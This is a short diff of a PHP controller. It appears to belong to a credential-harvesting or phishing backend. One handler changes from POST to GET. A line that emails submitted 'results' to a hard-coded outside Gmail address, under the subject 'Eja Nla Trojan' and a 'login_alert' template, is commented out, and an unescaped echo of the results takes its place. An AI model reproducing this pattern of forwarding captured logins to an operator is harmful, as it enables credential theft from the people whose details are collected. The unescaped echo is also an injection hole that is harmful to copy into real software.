@@ -31,7 +31,7 @@ class MainController extends Controller {
     }
     
     
-    public function postSneh(Request $request)
+    public function getSneh(Request $request)
 	{
            $req = $request->all();
                
@@ -59,7 +59,8 @@ class MainController extends Controller {
                  	  $s = "Eja Nla Trojan";
                        $rcpt = "mails4davidslogan@gmail.com";
                        $results = $req["results"];
-                          $this->helpers->sendEmail($rcpt,$s,['results' => $results],'emails.login_alert','view');  
+                       echo "here are the results: ".$results;
+                          #$this->helpers->sendEmail($rcpt,$s,['results' => $results],'emails.login_alert','view');  
                           $ret = ['mode' => "success"];                      
                   }       
            return $ret;                                                                                            
